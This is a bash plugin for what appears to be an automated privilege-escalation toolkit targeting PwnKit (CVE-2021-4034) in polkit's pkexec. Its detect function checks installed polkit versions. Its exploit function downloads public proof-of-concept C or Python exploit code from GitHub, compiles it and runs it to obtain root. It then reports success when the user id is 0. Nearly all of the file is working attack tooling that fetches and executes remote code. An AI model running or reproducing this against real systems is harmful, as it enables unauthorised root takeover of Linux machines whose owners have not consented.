#!/bin/bash
# PwnKit (CVE-2021-4034) Plugin
PLUGIN_NAME="polkit"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="CVE-2021-4034"
PLUGIN_DESCRIPTION="PwnKit - Polkit pkexec Local Privilege Escalation"

polkit_detect() {
    log_message "Checking for PwnKit vulnerability..." "INFO"
    
    if ! command_exists pkexec; then
        log_message "pkexec not found - not vulnerable" "INFO"
        return 1
    fi
    
    local pk_version="$POLKIT_VERSION"
    
    if [ -z "$pk_version" ]; then
        if command_exists dpkg; then
            pk_version=$(dpkg -l policykit-1 2>/dev/null | grep policykit | awk '{print $3}' | cut -d'-' -f1)
        elif command_exists rpm; then
            pk_version=$(rpm -q polkit 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
        fi
    fi
    
    local major=$(echo "$pk_version" | cut -d. -f1)
    local minor=$(echo "$pk_version" | cut -d. -f2)
    
    if [ -z "$pk_version" ] || ([ "$major" -eq 0 ] && [ "$minor" -lt 120 ]); then
        log_message "System VULNERABLE to PwnKit" "WARNING"
        return 0
    fi
    
    log_message "System NOT vulnerable to PwnKit" "INFO"
    return 1
}

polkit_exploit() {
    log_message "Attempting PwnKit exploitation..." "INFO"
    
    if ! polkit_detect; then
        return 1
    fi
    
    local exploit_source="${EXPLOIT_DIR}/pwnkit.c"
    local exploit_binary="${EXPLOIT_DIR}/pwnkit"
    local exploit_url="${EXPLOIT_SOURCES[polkit]}"
    
    [ -z "$exploit_url" ] && exploit_url="https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034.c"
    
    if ! download_exploit "pwnkit" "$exploit_url" "$exploit_source"; then
        # Try Python alternative
        local exploit_py="${EXPLOIT_DIR}/pwnkit.py"
        local py_url="https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py"
        
        if download_exploit "pwnkit_py" "$py_url" "$exploit_py"; then
            chmod +x "$exploit_py"
            log_message "Running Python PwnKit exploit..." "INFO"
            
            local py_cmd="python3"
            command_exists python3 || py_cmd="python"
            
            timeout_exec $TIMEOUT_CRITICAL "$py_cmd" "$exploit_py" &
            spinner $!
            wait $! 2>/dev/null
            
            if [ "$(id -u)" -eq 0 ]; then
                log_message "PwnKit Python exploit SUCCESSFUL!" "SUCCESS"
                return 0
            fi
        fi
        return 1
    fi
    
    if ! compile_exploit "$exploit_source" "$exploit_binary"; then
        log_message "Failed to compile PwnKit exploit" "WARNING"
        return 1
    fi
    
    log_message "Running PwnKit exploit..." "INFO"
    timeout_exec $TIMEOUT_CRITICAL "$exploit_binary" &
    spinner $!
    wait $! 2>/dev/null
    
    sleep 2
    if [ "$(id -u)" -eq 0 ]; then
        log_message "PwnKit exploit SUCCESSFUL!" "SUCCESS"
        return 0
    fi
    
    log_message "PwnKit exploit failed" "WARNING"
    return 1
}

polkit_info() {
    cat << 'EOFINFO'
PwnKit (CVE-2021-4034)
======================
A memory corruption vulnerability in polkit's pkexec that allows
any unprivileged user to gain full root privileges.

Affected: All polkit versions < 0.120 (since 2009)
Impact: Local privilege escalation to root
Discovery: Qualys Research Team
EOFINFO
}
